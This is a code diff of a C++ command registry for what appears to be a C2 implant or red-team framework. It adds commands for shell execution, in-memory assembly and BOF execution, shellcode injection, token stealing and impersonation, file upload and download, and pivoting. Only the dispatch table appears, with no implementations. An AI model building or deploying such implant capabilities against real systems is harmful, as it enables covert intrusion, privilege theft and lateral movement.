@@ -1,16 +1,26 @@
 #include "Command.h"
 
-BOOL CommandChannelRegister(json& args, string artifact, json& result);
-BOOL CommandChannelSwitch(json& args, string artifact, json& result);
-BOOL CommandChannelList(json& args, string artifact, json& result);
-BOOL CommandChannelRemove(json& args, string artifact, json& result);
-BOOL CommandWhoami(json& args, string artifact, json& result);
-BOOL CommandExit(json& args, string artifact, json& result);
-
 std::vector<ImplantCommand> g_CommandRegistry = {
-  {"exit",                 CommandExit            },
-  {"whoami",			         CommandWhoami          },
-  {"channel.switch",       CommandChannelSwitch   },
-  {"channel.register",     CommandChannelRegister },
-  {"channel.remove",       CommandChannelRemove   },
+    { "exit", CommandExit },
+    { "channel.switch", CommandChannelSwitch },
+    { "channel.register", CommandChannelRegister },
+    { "channel.remove", CommandChannelRemove },
+    { "ps", CommandPs },
+    { "cd", CommandCd },
+    { "cp", CommandCp },
+    { "download", CommandDownload },
+    { "upload", CommandUpload },
+    { "shell", CommandShell },
+    { "run", CommandRun },
+    { "execute-assembly", CommandExecuteAssembly },
+    { "job.list", CommandJobList },
+    { "job.stop", CommandJobStop },
+    { "inline-execute", CommandInlineExecute },
+    { "inject-shellcode", CommandInjectShellcode },
+    { "token.info", CommandTokenInfo },         // show current security tokens
+    { "token.rev2self", CommandTokenRev2Self }, // revert token
+    { "token.make", CommandTokenMake },         // create token
+    { "token.steal", CommandTokenSteal },       // steal process token
+    { "pivot.connect", CommandPivotConnect },
+    { "pivot.request", CommandPivotRequest },
 };
